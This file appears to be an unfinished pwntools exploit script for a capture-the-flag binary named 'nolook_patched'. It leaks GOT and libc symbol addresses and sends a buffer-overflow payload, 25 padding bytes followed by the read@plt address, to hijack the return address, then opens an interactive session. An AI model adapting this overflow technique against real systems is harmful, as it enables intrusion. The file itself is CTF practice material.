#!/usr/bin/env python3

from pwn import *
from binascii import hexlify

exe = ELF("nolook_patched")
libc = ELF("libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    # ret addr at 26 bytes offset
    read_got_addr = p64(exe.got["read"], endianness = 'little')
    print(b'got.read: ' + hexlify(read_got_addr))
    print(b'main: ' + hexlify(p64(exe.symbols["main"], endianness = 'big')))
    print(b'libc.read: ' + hexlify(p64(libc.symbols["read"], endianness = 'big')))

    #print('libc_base_addr' + read_got_addr - read_plt_addr)

    payload = b'a'*25 + p64(exe.plt["read"], endianness = 'little') # p32(0x00000000004005a7) + b' '+  read_addr
    r.send(payload)

    r.interactive()


if __name__ == "__main__":
    main()
